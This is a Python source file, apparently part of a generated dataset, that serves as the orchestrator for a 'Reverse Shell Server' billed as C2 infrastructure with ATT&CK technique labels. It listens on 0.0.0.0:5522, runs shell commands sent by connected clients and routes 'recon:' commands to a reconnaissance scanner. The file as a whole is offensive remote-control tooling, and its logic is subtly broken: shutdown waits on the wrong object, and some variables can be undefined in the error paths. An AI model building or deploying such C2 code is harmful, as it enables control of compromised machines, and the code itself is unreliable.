#!/usr/bin/env python3
"""
Reverse Shell Server - Main Entry Point and Orchestrator

Orchestrates all components (config, transport, executor, recon) into a cohesive
application that listens on 0.0.0.0:5522 for reverse shell connections.

ATT&CK Techniques: T1059, T1059.004, T1133
"""

import argparse
import signal
import sys
import threading
from typing import Optional

# Import all components from their respective modules
from data.code_scripts_PAST.stage3_DIMOS_test_v2.TASK_001_models import ReverseShellConfig, SocketAddress, CommandHandler, SessionState
from data.code_scripts_PAST.stage3_DIMOS_test_v2.TASK_002_utils import ExecutionResult, execute_shell_command, parse_socket_address, format_response, safe_eval
from data.code_scripts_PAST.stage3_DIMOS_test_v2.TASK_003_transport import ClientConnection, ReverseShellServer, create_server
from data.code_scripts_PAST.stage3_DIMOS_test_v2.TASK_004_executor import CommandExecutor
from data.code_scripts_PAST.stage3_DIMOS_test_v2.TASK_005_recon import ReconScanner, SystemInfo, NetworkEnumResult


class ReverseShellApp:
    """Main application orchestrator that wires all components together.

    This class serves as the single entry point for the reverse shell server,
    managing CLI argument parsing, signal handling, and coordinating between
    the transport layer (ReverseShellServer), command executor, and recon scanner.
    """

    def __init__(self, config: Optional[ReverseShellConfig] = None) -> None:
        """Initialize the ReverseShellApp with optional custom configuration.

        Args:
            config: ReverseShellConfig instance. If None, defaults to 0.0.0.0:5522.
        """
        self.config = config or ReverseShellConfig()
        self.server: Optional[ReverseShellServer] = None
        self.executor: CommandExecutor = CommandExecutor(default_timeout=30)
        self.recon_scanner: ReconScanner = ReconScanner()
        self._running: bool = False
        self._shutdown_event: threading.Event = threading.Event()

    def parse_args(self, args: Optional[list[str]] = None) -> argparse.Namespace:
        """Parse command-line arguments.

        Args:
            args: List of argument strings (defaults to sys.argv[1:]).

        Returns:
            Parsed namespace with bind_address, port, and debug flags.
        """
        parser = argparse.ArgumentParser(
            prog='reverse-shell-server',
            description='Reverse Shell Server - T1059/T1133 C2 Infrastructure',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
ATT&CK Techniques:
  T1059       : Command and Scripting Interpreter
  T1059.004   : Unix Shell (bash/sh)
  T1133       : Remote Services

Usage Examples:
  python main.py                          # Default: 0.0.0.0:5522
  python main.py --bind 127.0.0.1         # Bind to localhost only
  python main.py --port 9999               # Listen on custom port
  python main.py --debug                   # Enable debug logging
            """
        )

        parser.add_argument(
            '--bind', '-b',
            type=str,
            default='0.0.0.0',
            help='Bind address (default: 0.0.0.0)'
        )
        parser.add_argument(
            '--port', '-p',
            type=int,
            default=5522,
            help='Listen port (default: 5522)'
        )
        parser.add_argument(
            '--debug', '-d',
            action='store_true',
            dest='debug_mode',
            help='Enable debug logging mode'
        )

        return parser.parse_args(args)

    def _setup_signal_handlers(self) -> None:
        """Install signal handlers for graceful shutdown on SIGINT/SIGTERM.

        Sets up handlers that trigger a clean shutdown sequence, allowing
        active connections to be notified and resources to be released
        before the process exits.
        """
        # Register SIGINT (Ctrl+C) handler
        signal.signal(signal.SIGINT, self._signal_handler)
        # Register SIGTERM handler for graceful shutdown from init/systemd
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum: int, frame: Optional[object]) -> None:
        """Handle shutdown signals by triggering graceful shutdown.

        Args:
            signum: The signal number received (SIGINT=2, SIGTERM=15).
            frame: Current stack frame (unused in this handler).
        """
        print(f'\n[-] Received signal {signum} ({signal.Signals(signum).name})...')
        self._shutdown_event.set()

    def _create_server(self) -> ReverseShellServer:
        """Create and configure the ReverseShellServer instance.

        Returns:
            A configured ReverseShellServer ready to start listening.
        """
        # Create config from parsed arguments
        bind_host = self.config.bind_address.host if hasattr(self.config, 'bind_address') else '0.0.0.0'
        bind_port = self.config.port if hasattr(self.config, 'port') else 5522

        server_config = ReverseShellConfig(
            bind_address=SocketAddress(host=bind_host, port=bind_port),
            port=bind_port
        )

        return create_server(server_config)

    def _handle_client_connection(self, client_conn: ClientConnection) -> None:
        """Handle a single client connection in a background thread.

        This method runs as a daemon thread for each connected client,
        processing incoming data and routing commands through the executor
        or recon scanner based on the command prefix.

        Args:
            client_conn: The ClientConnection object to process.
        """
        try:
            while not self._shutdown_event.is_set():
                # Non-blocking read with timeout
                data = client_conn.read(timeout=0.1)

                if data is None or len(data) == 0:
                    continue

                # Decode and process the incoming command
                try:
                    raw_input = data.decode('utf-8', errors='replace').strip()

                    if not raw_input:
                        continue

                    # Route to appropriate handler based on command prefix
                    result = self._route_command(client_conn, raw_input)

                    # Format and send response back to client
                    response = format_response(result.to_dict())
                    client_conn.write(response.encode('utf-8'))

                except Exception as e:
                    error_msg = f"Error processing command: {e}"
                    if self.config.debug_mode:
                        print(f"[DEBUG] Client {client_conn.session_id}: {error_msg}")
                    else:
                        print(f"[!] Error: {error_msg}")

        except KeyboardInterrupt:
            client_conn.close()
            print(f'\n[-] Client session {client_conn.session_id} closed.')
        except Exception as e:
            if self.config.debug_mode:
                print(f"[DEBUG] Thread error for {client_conn.session_id}: {e}")
            else:
                print(f"[!] Connection error: {e}")

    def _route_command(self, client_conn: ClientConnection, command: str) -> ExecutionResult | dict[str, object]:
        """Route a command to the appropriate handler (executor or recon scanner).

        Args:
            client_conn: The connected client session.
            command: The raw shell command string.

        Returns:
            ExecutionResult from executor or dict from recon scanner.
        """
        cmd = command.strip()

        # Recon commands are prefixed with 'recon:'
        if cmd.startswith('recon:'):
            op_name = cmd[6:].strip()  # Remove 'recon:' prefix
            result = self.recon_scanner.run(op_name)

            if result is None:
                return ExecutionResult(
                    command=cmd,
                    stdout=f"Recon operation '{op_name}' not found. Available: {list(self.recon_scanner.COMMAND_REGISTRY.keys())}",
                    stderr="",
                    success=False,
                    exit_code=1
                )

            # Format recon results as JSON for wire transmission
            return dict(result) if isinstance(result, (SystemInfo, NetworkEnumResult)) else result

        # Default: route through command executor
        return self.executor.execute(cmd)

    def start(self) -> None:
        """Start the reverse shell server and begin listening for connections.

        This method sets up the signal handlers, creates the server instance,
        starts the main loop thread, and begins accepting client connections.
        """
        print(f'\n[+] Reverse Shell Server Starting...')
        print(f'    Bind Address: {self.config.bind_address.host}:{self.config.port}')
        if self.config.debug_mode:
            print(f'    Debug Mode:   ENABLED')

        # Create and configure the server
        self.server = self._create_server()

        # Set up signal handlers for graceful shutdown
        self._setup_signal_handlers()

        # Start the main server loop in a background thread
        self._running = True
        self.server.start()

        print(f'[+] Server listening on {self.config.bind_address.host}:{self.config.port}')
        print(f'    Press Ctrl+C to stop\n')

    def stop(self) -> None:
        """Gracefully shutdown the server and all connected clients.

        This method stops accepting new connections, notifies active threads,
        waits for them to finish processing, then closes all sockets.
        """
        print(f'\n[-] Shutting down...')
        self._shutdown_event.set()

        if self.server:
            self.server.stop()

        # Wait a brief moment for threads to exit cleanly
        try:
            threading.Event().wait(0.5)
        except KeyboardInterrupt:
            pass

        print(f'[-] Server stopped.')

    def run(self, args: Optional[list[str]] = None) -> int:
        """Main entry point - parse args, start server, handle shutdown.

        Args:
            args: Command-line arguments (defaults to sys.argv[1:]).

        Returns:
            Exit code (0 for success, 1 for error).
        """
        try:
            # Parse CLI arguments
            parsed = self.parse_args(args)

            # Create config from parsed arguments
            bind_host = parsed.bind if hasattr(parsed, 'bind') else '0.0.0.0'
            bind_port = parsed.port if hasattr(parsed, 'port') else 5522
            debug_mode = parsed.debug_mode if hasattr(parsed, 'debug_mode') else False

            config = ReverseShellConfig(
                bind_address=SocketAddress(host=bind_host, port=bind_port),
                port=bind_port
            )

            # Initialize and start the application
            app = ReverseShellApp(config)
            app.start()

            # Wait for shutdown signal (SIGINT/SIGTERM or KeyboardInterrupt)
            try:
                while not self._shutdown_event.is_set():
                    threading.Event().wait(1.0)
            except KeyboardInterrupt:
                pass

        except Exception as e:
            print(f'\n[!] Server error: {e}')
            if debug_mode:
                import traceback
                traceback.print_exc()
            return 1

        finally:
            app.stop()


def main(args: Optional[list[str]] = None) -> int:
    """Main entry point for the reverse shell server.

    Args:
        args: Command-line arguments (defaults to sys.argv[1:]).

    Returns:
        Exit code (0 for success, non-zero for error).
    """
    app = ReverseShellApp()
    return app.run(args)


if __name__ == '__main__':
    sys.exit(main())
